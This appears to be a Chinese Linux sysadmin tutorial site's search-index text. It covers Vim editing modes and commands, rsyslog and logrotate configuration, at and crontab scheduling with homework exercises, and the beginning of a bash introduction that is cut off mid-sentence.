正常(normal)模式,缺省的编辑模式;下面如果不加特殊说明,提到的命令都直接在正常模式下输入;任何其它模式中都可以通过键盘上的 Esc 键回到正常模式。 命令(command)模式 ,用于执行较长、较复杂的命令;在正常模式下输入 “ :” (一般命令)、 “ /”(正向搜索)或 “ ?”(反向搜索)即可进入该模式;命令模式下的命令要输入回车键(Enter)才算完成。 插入(insert)模式 ,输入文本时使用;在正常模式下键入 “ i”(insert )或 “ a”(append)即可进入插入模式(也有另外一些命令,如 “ c”,也可以进入插入模式,但这些命令有其它的作用)。 可视(visual)模式 ,用于选定文本块;可以在正常模式下输入 “ v”(小写)来按字符选定,输入“V” (大写)来按行选定,或输入 “ Ctrl-V”来按方块选定。 选择(select)模式 ,与普通的 Windows 编辑器较为接近的选择文本块的方式;在以可视模式和选择模式之一选定文本块之后,可以使用 “ Ctrl-G” 切换到另一模式 —— 该模式很少在 Linux 上使用,本文中就不再介绍了。 正常模式 命令模式 插入模式 i 光标所在位置插入 I 光标所在位置行首插入 o 光标所在位置下方新开一行插入 O 光标所在位置上方新开一行插入 a 光标所在位置下一个字符的位置插入 A 光标所在位置行行尾插入 Vim 实例本实例作为基础教程,拓展部分见附录《Vim 用户手册中文版 7.2》 Vim 第一步首次运行 Vim123[root@mastera0 ~]# ll file1-rw-r--r--. 1 root root 274 Jun 24 12:19 file1[root@mastera0 ~]# vim file1 使 Vim 开始编辑一个名为 file1 的文件。屏幕上看起来大致是这样: “黑色块” 代表当前光标位置; 上波浪线(~)表示所在行并不是文件内容的一部分。换句话说,Vim 将 文件之外的部分显示为波浪线; 在窗口的底部, 一个消息行显示说当前正 在编辑的文件叫 file1,它有 16 行,274 个字符。但前光标所在位置为第一行的第一位 如果是新文件呢? 1[root@mastera0 ~]# vim file 在窗口的底部, 一个消息行显示说当前正 在编辑的文件叫 file,并且它是一个新文件。 插入文本Vim 编辑器是一个模式编辑器。这意味着在不同状态下编辑器有不同 的行为模式。两个基本的模式 Normal模式和 Insert 模式。在 Normal 模式下你键入的每一个字符都被视为一个命令。而在 Insert 模式下键入的字符 都作为实际要输入的文本内容。 刚启动时 Vim 工作于 Normal 模式。要进入 Insert 模式你需要使用”i” 命 令(i 意为 Insert)。接下来就可以直接输入了。别怕出错, 错了还可以修 改。比如下面这首程序员的打油诗:12A very intelligent turtleFound programming UNIX a hurdle“turtle” 之后你按下回车键另起一行。最后按下 键退出 Insert 模式 ,回到 Normal 模式。现在你的Vim 窗口中有了这样的两行内容 : 现在是什么模式? 要知道你现在所处的工作模式是什么,打开显示模式的开关:12:set showmode:set noshowmode 关闭显示模式 你会看到按下冒号键之后当前光标跑到窗口的最后一行去了。那是使用冒 号命令的地方(顾名思义,冒号命令就是总是以冒号打头的命令) 。最后按 下回车键结束整个命令(所有的冒号命令都以这种方式表明命令的结束). 现在,如果你键入了”i”命令 Vim 就会在窗口底部显示–INSERT– 。这 表明你目前处于 Insert 模式。如 果 按 下 键 返 回 到 Normal 模 式 刚 才 显 示 出 来 的 模 式”–INSERT– 就会消失 ;Normal模式并不会显示 — NORMAL–,作为默认的工作模式它不显示任何字串。 Vim 新手最头痛的问题就是模式—经常忘记自己置身于何种模式, 或者不经意敲了哪个字符就切换到别的模式去了。 不管你当前所处的模 式是什么,按下都会让你回到 Normal 模式(即使已经在 Normal 模式 下)。有时需要按两次,如果 Vim 以一声蜂鸣回答你, 那说明你已经 是在 Normal 模式了。 移动光标回到 Normal 模式后 , 你就可以用下面的命令来移动光标 : h 左 j 下 k 上 l 右 人们一开始会认为这些字符是随意选取的。毕竟有谁 l 来代 表 right 呢 ? 但事实上 , 这些字符都是精心挑选的 : 在编辑器中移动光 标是十分常用的操作 , 这些字符在键盘上都分布在你右手周围。这样的安 排可以使你最快最方便地使用它们 ( 尤其是对那些用十个手指而不是二指 禅用户而言 ) 。 备注 : 同时你还可以用箭头键来移动光标。不过这样做实 际上会大大降低你的效率。因为用这些键你需要不停地在 字母区和箭头键之间频繁转换。想象一下要是你在一小时 内这样做一百次会占用你多少时间 ? 另外 , 并不是每个键 盘上都安排有箭头键 , 或者都把它们放在最常见的位置 ; 所以使用 hjkl 还是大有好处。 练习文件名位 hjkl ,放在共享当中。如果进入了插入模式不要忘了要用 回到 Normal 模 式。 |vimtutor| 也是学习这些命令的一个好去处。 记住:学习这些命令的最好办法不是使用什么记忆法 , 而是练习。 删除字符要删除一个字符,只需要将光标移到该字符上按下”x”. ( 这是在追 忆古老的打字机时代,在打字机上删除字符就是用 xxxx 来覆盖它) 把光标 移到上面例子中的第一行,键入 xxxxxxx(7 个 x) 来删除”A very “。 输入其它内容比如:首先键入的命令是 i( 进 入 Insert 模 式), 接着插入”A young”, 然后 退 出 Insert 模式(最后的)。 删除一行 删除一整行内容使用”dd”命令。删除后下面的行会移上来填补空缺:2.1.5 撤消与重做 撤销一次操作 如果你误删了过多的内容。显然你可以再输入一遍,但是命令”u” 更 简便, 它可以撤消上一次的操作 1 。实际看一下它的效果,用”dd” 命令来 删除前面例子中的第一行内容,”u”命令会把它找回来。 重做如果你撤消了多次,你还可以用 CTRL-R(重做) 来反转撤消的动作。换 句话说,它是对撤消的撤消。 撤销一行操作 撤消命令还有另一种形式,”U”命令, 它一次撤消对一行的全部操作。第 二次使用该命令则会撤消前一个”U”的操作。 删除 very 删除 turtle 用”u”撤消”U” 用”U” 恢复该行 “U”命令本身也造成了一次改变,这种改变同样可以用”u” 命令 和 CTRL-R 来撤消和重做。看起来这很容易把人搞糊涂,不过别担心, 用”u”和 CTRL-R 你可以找回任何一个操作状态。 其它编辑命令Vim 有一大堆命令来改变文本。这里仅列 出一些最常用的。 追加 a “i” 命令可以在当前光标之前插入文本。但如果你想在当前行的末尾 添加一些内容时怎么办呢?你必需在光标之后插入文本。答案是用”a” 命 令来代替”i”。 另起一行 o\\O “o”命令可以在当前行的下面另起一行,并使当前模式转为 Insert 模 式。这样你可以在该命令之后直接输入内容。假设光标位于下面两行中第 一行的某处: “O”命令(注意是大写的字母 O)将在当前行的上面另起一行。 使用命令计数 假设你要向上移动 9 行。这可以用”kkkkkkkkk”或”9k” 来完成。事实 上,很多命令都可以接受一个数字作为重复执行同一命令的次数。比如刚 才的例子,要在行尾追加三个感叹号,当时用的命令是”a!!!“。另 一个办法是用”3a!“命令。 3 说明该命令将被重复执行 3 次。同样, 删 除 3 个字符可以用”3x”。指定的数字要紧挨在它所要修饰的命令前面。 退出要退出 Vim,用命令”ZZ”。该命令保存当前文件并退出 Vim. 放弃编辑 :q! 有时你会在做了一连串修改之后突然意识到最好是放弃所有的修改重 新来过。别担心。Vim 中有一个命令可以丢弃所有的修改并退出::q!别忘了在命令之后加回车。 放弃编辑并重新载入 :e! 如果你在放弃所有修改后还想以该文件的初始内容作为开始继续编 辑,还可以用”:e!”命令放弃所有修改并重新载入该文件的原始内容。 保存并退出:wq :wq! 一般我们都是需要保存并退出的,有一些文件保存的时候需要强制保存退出,这时加上!即可。比如/etc/shadow2.1.8 求助 你想做的任何操作都可以在 Vim 的帮助文件里找到答案, 别怕问问 题!:help 会带你到帮助文件的起始点。 如果你没有指定一个具体的帮助主题,”:help” 命令会显示上面提到 的帮助文件的起点。Vim 的作者聪明地(也许是懒惰地) 设计了它的帮助系 统: 帮助窗口也是一个普通的编辑窗口。你可以使用跟编辑其它文件时一样的命令来操作帮助文件。比如用 hljk 移动光标。 退出帮助窗口也跟退出其它文件编辑窗口一样,使用”ZZ” 即可。这只 会关闭帮助窗口,而不是退出 Vim.浏览帮助文件时,你会注意到有一些内容用两个小栅栏围了起来( 比 如|help|)。这表明此处是一个超链接。如果你把光标置于两个小栅栏之间的任何位置然后按下 CTRL-](跳转到一个标签的命令),帮助系统就会带你 到那个指定的主题。(因为一些此处不便讨论的原因,在 Vim 的术语中这种 超链接叫标签。所以 CTRL-]可以跳转到当前光标之下的那个 word 所对应的 链接中 1 。 几次跳转之后,你可能想回到原来的某个地方,CTRL-T(弹出标签) 可 以回到前一个位置。用命令 CTRL-O(跳转到较早的位置) 也可以。 帮助窗口的开始有一个关于help.txt*的说明。在星号”“ 之间的字 符被帮助系统定义为一个标签的目的地(超链接的目的地). 要查看关于某个特殊主题的帮助,使用下面的命令形式::help {subject} 例如,查看关于 showmode 的帮助:help showmode3.2 改动 光标的指定移动“G”命令 指定一 个命令计数, 这个命令就会把光标定位到由命令计数指定的行上。比 如”33G”就会把光标置于第 33 行上。 12[root@mastera0 ~]# cp /var/log/messages messages[root@mastera0 ~]# vim messages 没有指定命令计数作为参数的话 : “G” 会 把 光 标 定 位 到 最 后 一 行 上 “gg”命令是跳转到第一行的快捷的方法。”1G”效果也是一样, 但是敲 起来就没那么顺手了。 “%”命令 另一个移动到某行的方法是在命令”%” 之前指定一个命令计数 。 如”50%”将会把光标定位在文件的中间;比”90%” 跳到接文件尾的地 方 。 简单搜索“/string”命令 “/string”命令可用于搜索一个字符串。比如要找到单词”mysql”, 使用命令:/mysql 要查找上次查找的字符串的下一个位置。使用”n” 命令。如果你知 道你要找的确切位置是目标字符串的第几次出现,还可以在”n” 之前放置 一个命令计数。”3n”会去查找目标字符串的第 3 次出现。向光标所在位置以上查找用”N”。 “?string”命令 “?”命令与”/“的工作相同,只是搜索方向相反。比如要找到单词”mysql”, 使用命令:?mysql忽略大小写 通常情况下你要准确地键入你要查找的东西。如果你并不关心目标字 符中字母的大小写,可以通过设置’ignorecase’选项::set ignorecase 取消则设置’noignorecase’选项::set noignorecase 如果你在编辑一段源程序时看到了一个叫”nr” 的变量。你想查看一 下这个变量就被用在了哪些地方。简单的办法是把光标移到”nr” 上然后 用”*” 命令和”n” 命令一个一个地查找所有的匹配。不过还有更好的办法。使用下面的命令::set hlsearch 现在你要再查找”nr”, Vim 就会以某种形式高亮显示所有符合的匹配。对 于想查看一个变量被用在哪些地方,这个办法太棒了, 不需任何其它的命 令 看得眼花的时候还可以关闭这一功能::set nohlsearch 不过你要在下次搜索时再次使用这一功能就又得打开它。如果你只是想去 掉当前的高亮显示,可以使用下面的命令 ::nohlsearch 复制粘贴要把文本内容从一处复制到另一处 先删除 dd 再粘贴 p “y” 操作符命令会把文本复制到一个寄存器 中。然后可以用”p”命令把它取回。 “y”命令 “yw”来复制一个 word; “y2w”命令复制两个 word; “yy”复制一行; “3yy”复制光标所在行和向下的行,一共三行; 例如: 复制 file 文件中的 turtle 并粘贴到该行的最后; 复制 file 文件中的 intelligent turtle 并粘贴到该行的最后; 复制 file 文件中的第二行并粘贴到第四行; 复制 file 文件中的第一行第二行第三行,并粘贴到第五行第六行第七行。 替换字符 :s/UNIX/linux 对光标所在行第一个出现的 UNIX 替换成 linux :s/UNIX/linux /g 对光标所在行所有 UNIX 都替换成 linux , g 表示全行替换 :% s/UNIX/linux /g 将全文中的 carol 都替换位 natasha , “%” 指定该命令将作用于所有行上 Vim 的保护机制如果我们没有通过 q 退出,而是通过其他方式强行退出,比如说直接关终端,会导致 vim 的一个报错,当我们下次打开这个文件的时候,会提示Found a swap file by the name &quot;.file.swp&quot; 这是因为 vim 他不是实时写入的机制,他会先把文件写到内存,等我们执行 w 操作以后,再写回到原文件。那么在写回原文件,或者执行 q 的放弃操作之前,会生成一个临时的文件,以 . 开头, swp 结尾。当我们看到这种情况,就说明这个文件是在变编辑的过程中强制退出的,或者是正在被人编辑。 所以这个文件的作用就是防止强制退出造成的数据安全隐患,和防止文件同时被多次修改。12Swap file &quot;.file.swp&quot; already exists![O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort: 我们可以根据他的提示执行相应的操作,比如说 Q ,退出。如果想要顺利编辑这个文件的话,一方面可以使用 E ,无论如何也要编辑,或者先退出,把 swp 文件删除了以后再编辑,也是可以的。 注意:要使用 vim 需要注意一下权限问题,必须要有读写权限才能使用 vim 。 可以看一下没有写权限和没有读权限会出现什么问题。 Vim 编辑器课后作业 复制/etc/sysconfig/network-scripts/ifcfg-eth0的配置文件位/tmp/test 使用vim编辑该文件，练习不同模式的切换，尤其是正常变插入模式的几种用法 练习保存的几种命令，包括保存退出，不保存退出。 vim练习游戏 vim大冒险官网 vim-adventures.com","link":"/2016/12/22/booboo_linux_base/06-Vim/"},{"title":"Linux 日志和计划任务","text":"日志日志的作用 解决系统方面的错误 解决网络服务的问题 过往事件记录 常用的日志 日志 解释 /var/log/cron crontab 计划任务 /var/log/dmesg 开机核心侦测信息 /var/log/lastlog 系统所有帐号最近一次登陆信息 /var/log/maillog 邮件往来信息 /var/log/messages 系统错误信息 /var/log/secure 涉及输入帐号密码的程序 /var/log/wtmp 正确登陆系统的账户信息 /var/log/btmp 错误登陆系统的账户信息 /var/log/httpd/* /var/log/samba/* 不同的网络服务会使用它们自己的登录文件来记载它们自己产生的各项信息 日志的类型1&gt; 可查看的 ASCII 的日志 • messages • 与程序同名的目录下, 会记录和该程序相关的一些日志 2&gt; 不可查看的 data 日志 需要调用某些命令才能去查看对应的日志 • wtmp &lt;==last: 系统登陆登出信息 • btmp &lt;==lastb: 错误的系统登陆登出情况 12[#3#root@rhel6 ~]#file /var/log/wtmp/var/log/wtmp: data 日志需要的服务和程序rsyslogd 主要负责记录系统运作中 , kernel 或应用程序产生的各种讯息 , 讯息被写入系统日志 logrotate 主要在进行日志文件的轮替功能 rhel5 版本以前是 syslogd 服务 , rhel6 之后是 rsyslogd 服务 ( reliable and extended 可靠的和拓展的syslogd 服务 ) 『 (1) 什么服务 (2) 什么等级信息 (3) 需要被记录在哪里 ( 设备或文件 ) 』 rsyslog 的相关配置文件• /etc/rsyslog.conf • /etc/rsyslog.d/* /etc/rsyslog.conf/etc/rsyslog.conf 文件中的一项配置记录由 “ 选项 ” (selector) 和 “ 动作 ” (action)两个部分组成,两者间用 tab 制表符进行分隔(使用空格间隔是无效的)。 “ 选项 ” ( selector)由两部分组成: 设施 facility 和级别 loglevel,由点号.分隔,两部分都是大小写不敏感; 设施和级别都在 syslog(3)中有描述。各保留字段间用分号分隔。 如下行所示: 设施. 级别 [;设施.级别]TAB 动作 设施 facility保留字段中的 “ 设施 ” (facility )代表信息产生的源头,可以是: facility 设施 auth 认证系统,即询问用户名和口令 cron 系统定时系统执行定时任务时发出的信息 daemon 某些系统的守护程序的 syslog,如由 in.ftpd 产生的 log kern 内核的 syslog 信息 lpr 打印机的 syslog 信息 mail 邮件系统的 syslog 信息 mark 定时发送消息的时标程序 news 新闻系统的 syslog 信息 user 本地用户应用程序的 syslog 信息 uucp uucp 子系统的 syslog 信息,unix to unix copy, unix 主机之间相关的通讯 local0-7 种本地类型的 syslog 信息,这些信息可以又用户来定义 * 代表以上各种设备 级别 loglevel保留字段中的 “ 级别 ” 代表信息的重要性,可以是: num loglevel 级别 0 emerg 紧急,处于 Panic 状态。通常应广播到所有用户;几乎要当机 1 alert 告警,当前状态必须立即进行纠正。例如,系统数据库崩溃; 2 crit 关键状态的警告。例如,硬件故障; 3 err 其它错误; 4 warn 警告; 5 notice 注意;非错误状态的报告,但应特别处理; 6 info 通报信息; 7 debug 调试程序时的信息; none 通常调试程序时用,指示带有 none 级别的类型产生的信息无需送出。如 *.debug;mail.none 表示调试时除邮件信息外其它信息都送出。 .xxx: 表示大于等于 xxx 级别的信息 .=xxx: 表示等于 xxx 级别的信息 .!xxx: 表示在 xxx 之外的等级的信息拓展: 1[#19#root@rhel6 ~]#man syslog 动作 action“ 动作 ” 域指示信息发送的目的地。可以是: action 动作 /filename 日志文件。由绝对路径指出的文件名,此文件必须事先建立; @host 远程主机; @符号后面可以是 ip,也可以是域名,默认在/etc/hosts 文件下 loghost 这个别名已经指定给了本机。 user1,user2 指定用户。如果指定用户已登录,那么他们将收到信息; * 所有用户。所有已登录的用户都将收到信息。 示例 记录到普通文件或设备文件12*.* /var/log/file.log*.* /dev/pts/0 测试: logger -p local3.info ‘KadeFor is testing the rsyslog and logger ‘ logger 命令用于产生日志 转发到远程12*.* @192.168.0.1 # 使用 UDP 协议转发到 192.168.0.1 的 514(默认)端口*.* @@192.168.0.1:10514 # 使用 TCP 协议转发到 192.168.0.1 的 10514(默认)端口 发送给用户(需要在线才能收到)123*.* root*.* root,kadefor,up01*.* * 使用,号分隔多个用户 *号表示所有在线用户 忽略,丢弃1local3.* # 忽略所有 local3 类型的所有级别的日志 执行脚本1local3.* ^/tmp/a.sh ^号后跟可执行脚本或程序的绝对路径 一个标准的简单的配置文件1234567891011121314151617181920212223242526272829303132333435363738#### RULES ####规则部分# Log all kernel messages to the console.# Logging much else clutters up the screen.#kern.*/dev/console#关于内核的所有日志都放到/dev/console(控制台)# Log anything (except mail) of level info or higher.# Don&apos;t log private authentication messages!*.info;mail.none;authpriv.none;cron.none/var/log/messages# 记录所有日志类型的 info 级别以及大于 info 级别的信息到/var/log/messages,但是 mail邮件信息,authpriv 验证方面的信息和 cron 时间任务相关的信息除外# The authpriv file has restricted access.authpriv.*/var/log/secure# authpriv 验证相关的所有信息存放在/var/log/secure# Log all the mail messages in one place.mail.*-/var/log/maillog# 邮件的所有信息存放在/var/log/maillog; 这里有一个-符号, 表示是使用异步的方式记录,因为日志一般会比较大# Log cron stuffcron.*/var/log/cron# 计划任务有关的信息存放在/var/log/cron# Everybody gets emergency messages*.emerg*# 所有日志类型的 emerg 信息发给所有用户# Save news errors of level crit and higher in a special file.uucp,news.crit/var/log/spooler# 记录 uucp,news.crit 等存放在/var/log/spooler# Save boot messages also to boot.loglocal7.*/var/log/boot.log# 启动的相关信息存放在/var/log/boot.log 重启服务service rsyslog restart &lt;==rhel6 systermctl restart rsyslog &lt;==rhel7 ps : rsyslog 的日志只要『被编辑过』就无法继续记录 ! 需要重启日志恢复。 logrotate 日志轮询/usr/sbin/logrotate 将旧的日志文件移动成旧文件, 并重新建立一个新的空的档案来记录 /etc/cron.daily/logrotate 记录每天要进行的日志轮替的行为 /etc/logrotate.conf /etc/logrotate.d/* 程序的配置文件 123456789101112131415161718[#14#root@rhel6 ~]#grep -v &quot;^#&quot; /etc/logrotate.conf|grep -v &quot;^$&quot;weeklyrotate 4createdateextinclude /etc/logrotate.d/var/log/wtmp {monthlycreate 0664 root utmpminsize 1Mrotate 1}/var/log/btmp {missingokmonthlycreate 0600 root utmprotate 1} 可以通过 man logrotate 来查看更多的一些定义。 参数和功能compress 通过 gzip 压缩转储以后的日志 nocompress 不需要压缩时,用这个参数 copytruncate 用于还在打开中的日志文件,把当前日志备份并截断 nocopytruncate 备份日志文件但是不截断 create mode owner group 转储文件,使用指定的文件模式创建新的日志文件 nocreate 不建立新的日志文件 delaycompress 和 compress 一起使用时,转储的日志文件到下一次转储时才压缩 nodelaycompress 覆盖 delaycompress 选项,转储同时压缩。 errors errors 转储时的错误信息发送到指定的 Email 地址 ifempty 即使是空文件也转储,这个是 logrotate 的缺省选项。 notifempty 如果是空文件的话,不转储 mail address 把转储的日志文件发送到指定的 E-mail 地址 nomail 转储时不发送日志文件 olddir directory 转储后的日志文件放入指定的目录,必须和当前日志文件在同一个文件系统 noolddir 转储后的日志文件和当前日志文件放在同一个目录下 prerotate/endscript 在转储以前需要执行的命令可以放入这个对,这两个关键字必须单独成行 postrotate/endscript 在转储以后需要执行的命令可以放入这个对,这两个关键字必须单独成行 daily 指定转储周期为每天 weekly 指定转储周期为每周 monthly 指定转储周期为每月 rotate count 指定日志文件删除之前转储的次数,0 指没有备份,5 指保留 5 个备份 tabootext [+] list 让 logrotate 不转储指定扩展名的文件,缺省的扩展名是:.rpm-orig, .rpmsave, v, 和 ~ size size 当日志文件到达指定的大小时才转储,Size 可以指定 bytes (缺省)以及 KB (sizek)或者 MB (sizem). 实验要求: 记录所有日志类型的 info 级别以及大于 info 级别的信息,保存到/var/log/test,但是 mail邮件信息,authpriv 验证方面的信息和 cron 时间任务相关的信息除外 /var/log/test 日志轮询方式为: • 每天轮询一次; • 保留 4 个文件; • 以时间命名; • 创建与原日志同名的新文件。 第一步:修改 rsyslog 的配置文件/etc/rsyslog.conf *.info;mail.none;authpriv.none;cron.none 第二步:创建空文件/var/log/test touch /var/log/test 第三步:重新启动服务 service rsyslog restart 第四步:修改 logrotate 配置文件/etc/logrotate.conf12345/var/log/test { &lt;== 轮循的日志是谁daily &lt;== 轮询周期多久rotate 4 &lt;== 保留几个带时间戳的文件dateext &lt;== 是否以时间戳为文件更名格式create &lt;== 是否需要创建一个与原日志文件同名的新文件第五步:测试 logrotate -vf /etc/logrotate.conf 12345[#41#root@rhel6 ~]#logrotate -vf /etc/logrotate.conf[#42#root@rhel6 ~]#ls /var/log/|grep testtesttest-20160630/var/log/test计划任务每个人或多火烧都有一些约会或者是工作,有的工作是例行性的, 例如每年一次的加薪、每个月一次 的工作报告、每周一次的午餐会报、每天需要的打卡等等; 有的工作则是临时发生的, 例如刚好总公 司有高官来访,需要你准备演示器材等等! 用在生活上面, 例如每年的爱人的生日、每天的起床时间 等等、还有突发性的计算机大降价 (啊!真希望天天都有!) 等等啰。 像上面这些例行性工作,通常你得要记录在日历上面才能避免忘记!不过, 由于我们常常在计算机前 面的缘故,如果计算机系统能够主动的通知我们的话,那么不就轻松多了!嘿嘿! 这个时候 Linux 的 计划任务就可以派上场了! 例如: 每一天早上 8:00 钟要服务器连接上音响,并自动播放音乐来唤你起床; 而中午 12:00 希望 Linux 可以发一封信到你的邮件信箱,提醒你可以去吃午餐了; 另外, 在每年的你爱人生 日的前一天,先发封信提醒你, 以免忘记这么重要的一天。 那么 Linux 的例行性工作是如何进行计划任务的呢? 咱 们的 Linux 是透过 crontab 和 at 这两个东西!这两个玩意儿有啥异同?就让我们来瞧瞧先! 一次性计划任务 周期性计划任务 软件 at-3.1.10-43.el6_2.1.x86_64 cronie-1.4.4-12.el6.x86_64 服务 atd crond 命令 at crontab 服务存放文件 /etc/init.d/atd /etc/init.d/crond 系统配置文件 /etc/at.deny /etc/cron.deny /etc/cron.d/* 程序缓存文件 /var/spool/at /var/spool/cron/* /var/log/cron at当执行 at 程序并在终端输入命令后, 首先系统会到配置文件中寻找 at 相关的文档 /etc/at.allow &lt;== 记录了允许使用 at 命令的用户名 /etc/at.deny &lt;== 记录了不允许使用 at 命令的用户名 若以上两个文件都没有, 则系统默认只有 root 可以使用 at 输入的内容将被保存到以下目录中 /var/spool/at/* 服务的启动命令rhel6 service atd start 启动 service atd restart 重启 service atd status 查看 rhel7 systermctl start atd systermctl restart atd systermctl status atd at 命令的用法1234567891011at [-mldv] TIMEat -c 工作号码选项与参数 :-m 当 at 工作完成后 , 即使没有输出讯息 , 亦以 email 通知使用者该工作已完成。-l at -l =atq, 列出目前系统上面的所有该用户的 at 计划任务 ;-d at -d =atrm , 可以取消一个在 at 计划任务中的工作 ;-v 可以使用较明显的时间格式显出 at 计划任务中的任务列表 ;-c 可以列出后面接的该项工作的实际指令内容。 范例 再过五分钟后, 将 /root/.bashrc 寄给 root 自己 查看 at 计划任务中的工作 查看该计划任务的实际指令内容123456789101112131415161718192021222324252627282930313233343536[#60#root@rhel6 ~]#at now + 5 minutesat&gt; /bin/mail root -s &quot;testing at job&quot; &lt; /root/.bashrcat&gt; &lt;EOT&gt;job 1 at 2016-06-30 00:40[#61#root@rhel6 ~]#at -l12016-06-30 00:40 a root[#62#root@rhel6 ~]#dateThu Jun 30 00:37:21 CST 2016[#63#root@rhel6 ~]#at -c 1#!/bin/sh# atrun uid=0 gid=0# mail root 0umask 22.........此处省略OLDPWD=/var/log; export OLDPWDcd /root || {echo &apos;Execution directory inaccessible&apos; &gt;&amp;2exit 1}${SHELL:-/bin/sh} &lt;&lt; &apos;marcinDELIMITER00a5c603&apos;/bin/mail root -s &quot;testing at job&quot; &lt; /root/.bashrcmarcinDELIMITER00a5c6034. 2016 年 10 月 20 日 12:00 广播一条信息 “ Happy birthday to me!”;取消该计划任务。[#68#root@rhel6 ~]#at 12:00 2016-10-20at&gt; echo &quot;Happy birthday to me!&quot;|wallat&gt; &lt;EOT&gt;job 2 at 2016-10-20 12:00[#69#root@rhel6 ~]#atq22016-10-20 12:00 a root[#70#root@rhel6 ~]#at -l22016-10-20 12:00 a root[#71#root@rhel6 ~]#at -d 2[#72#root@rhel6 ~]#atq 由于机房预计划 2016/07/18 停电, 我想要在 2016/07/17 23:00 关机?1234567[#73#root@rhel6 ~]#at 23:00 2016-07-17at&gt; shutdown -h nowat&gt; &lt;EOT&gt;job 3 at 2016-07-17 23:00[#74#root@rhel6 ~]#atq32016-07-17 23:00 a root crontabcrontab 服务的启动命令rhel6 service crond start 启动 service crond restart 重启 service crond status 查看 rhel7 systermctl start crond systermctl restart crond systermctl status crond crontab 命令的用法1234567crontab [-u username] [-l|-e|-r]选项与参数 :-u 只有 root 使用 , 亦即帮其他使用者建立 / 移除 crontab 计划任务;-e 编辑 crontab 工作内容-l 查阅 crontab 工作内容-r 移除所有 crontab 的工作内容 , 若仅要移除一项 , 请用 -e 去编辑 crontab -e 编辑的格式说明: 代表意义 分钟 小时 日期 月份 周 数字范围 0-59 0-23 1-31 1-12 0-7 特殊字 代表意义 *( 星号 ) 代表任何时刻 ,( 逗号 ) 代表分隔时段 -( 减号 ) 代表一段时间范围 /n( 斜线 ) n 代表数字 , 『每隔 n 单位间隔』 , 例如每五分钟进行一次 man 5 crontab 查看具体用法帮助 范例 student 每天 12 点发广播给自己提醒要吃饭拉!1234crontab -evi 编辑画面 每项工作都是一行。0 12 * * * echo “Lunch time!!!!”|wall分 时 日 月 周 |&lt;======= 命令 ===========| 每个月的第一天下午 2 点 15 分,将/etc 目录打包压缩成/tmp/etc.tar.bz2 文件。115 14 1 * * tar -jcf /tmp/etc.tar.bz2 /etc 周一到周五的晚上 10 点,将/var 目录打包压缩成/tmp/var.tar.bz2 文件。10 22 * * 1-5 tar -jcf /tmp/var.tar.bz2 /var 每天 0 点 23 分,2 点 23 分,4 点分…22 点 23 分,就输出 “ 休息一会 ” 到终端上。123 0-23/2 * * * echo &quot;have a rest&quot; 每周日的 4 点 5 分提醒自己去跑步。15 4 * * sun echo &quot;run at 5 after 4 every sunday&quot; 日志和计划任务课后作业 记录所有日志类型的 info 级别以及大于 info 级别的信息,保存到/var/log/test,但是 mail 邮件信息,authpriv 验证方面的信息和 cron 时间任务相关的信息除外 /var/log/test 日志轮询方式为: 每周轮询一次; 保留 6 个文件; 以时间命名; 创建与原日志同名的新文件。 再过 10 分钟后, 将 /root/.bashrc 寄给 root 自己 查看 at 计划任务中的工作 查看该计划任务的实际指令内容 由于机房预计划 2016/09/18 停电, 我想要在 2016/09/17 23:00 关 机? student 每天上午 11:50 发广播给自己提醒要吃饭拉! 每个月的第一天下午 5 点 30 分,将/etc 目录打包压缩成/tmp/etc.tar.bz2 文件。 周一到周六的晚上 9 点,将/var 目录打包压缩成/tmp/var.tar.bz2 文件。 每天 1 点 22 分,3 点 22 分,5 点 22 分…23 点 22 分,就输出 “ 休息一会 ” 到终端上。 每周六的 6 点 20 分提醒自己去跑步。","link":"/2016/12/22/booboo_linux_base/08-crontab/"},{"title":"Linux Bash简介","text":"SHELLshell 简介Shell 是一个命令解释器, 是人与操作系统之间的桥梁。 我们平时无论任何操作,最终都要操作硬件,比如输入一个字符 “ a ”, 那么信号 首先会从键盘传递到主板,通过主板总线传递到内存,CPU,显卡等,最终经过显卡的运 算完成后在屏幕的某个位置, 显示一个特定字体的字符 “ a ”, 这一整个过程可以说是 不断的和硬件打交道了,但是如果让人去发送这些硬件操作码显然不适合, 因为这不是人干 的事,所以我们有了操作系统,操作系统通过加载一定的硬件驱动,从而控制硬件,操作硬件,那剩下的事就是如何和操作系统通信了,对于普通的系统管理员来说,这也是一件非常困难的事,为了方便人和操作系统沟通, 我们开发了 shell 。 Shell 可以将我们平时运行的一些指令解释给操作系统执行, 方便管理员操作系统。而 Shell 的脚本其实是一种命令的堆积,我们将所有需要执行的命令, 以从上至下的方 式写在一个文件当中, 交给 shell 去自动解释执行。 shell 历史在 AT&amp;T 的 Dennis Ritchie 和 Ken Thompson 设计 UNIXTM 的时候, 他们想要为 用户创建一种与他们的新系统交流的方法。那时的操作系统带有命令解释器。命令解释器接受用户的命令,然后解释它们,因而计算机可以使用这些命令。 但是 Ritchie 和 Thompson 想要的不只是这些功能,他们想提供比当时的命令解释器 具备更优异功能的工具。这导致了 Bourne shell ( 通称为 sh )的开发, 由 S.R. Bourne 创建。自从 Bourne shell 的创建, 其它 shell 也被一一开发, 如 C shell ( csh ) 和 Korn shell (ksh ) 。 当自由软件基金会想寻求一种免费的 shell , 开发者们开始致力于 Bourne shell 以及当 时其它 shell中某些很受欢迎的功能背后的语言。 这个开发结果是 Bourne Again Shell , 或称 bash 。虽然你的Red Hat Linux 包括几 种不同的 shell , bash 是为互动用户提供的默认 shell 。 常见的 shell Bourne shell 即 sh : AT&amp;T 贝尔实验室编写的一个交换式的命令解释器。 C Shell : Bill Joy 于 20 世纪 80 年代早期开发。为了让用户更容易的使用, 他把语法结构变成了 C语言风格。它新增了命令历史、别名、文件名替换、作业控制等功能。 korn shell (ksh) 是一个 Unix shell 。它由贝尔实验室的 David Korn 在二十世纪八十 年代早期编写。它完全向上兼容 Bourne shell 并包含了 C shell 的很多特性。 Bourne-Again SHell : bash 是一个为 GNU 项目编写的 Unix shell 。它的名字是一 系列缩写:Bourne-Again SHell — 这是关于 Bourne shell ( sh )的一个双关语( Bourne again / bornagain ) 。 Bourne shell 是一个早期的重要 shell , 由 Stephen Bourne 在 1978 年前后编写,并同 Version 7 Unix 一起发布。 bash 则在 1987 年由 Brian Fox 创造。 在 1990 年, ChetRamey 成为了主要的维护者。 bash 是大多数 Linux 系统以及 Mac OS X v10.4 默认的 shell ,它能运行于大多数 Unix 风格的操作系统之上, 甚至被移植到了 Microsoft Windows 上的 Cygwin 和MSYS 系统中, 以实现 windows 的 POSIX 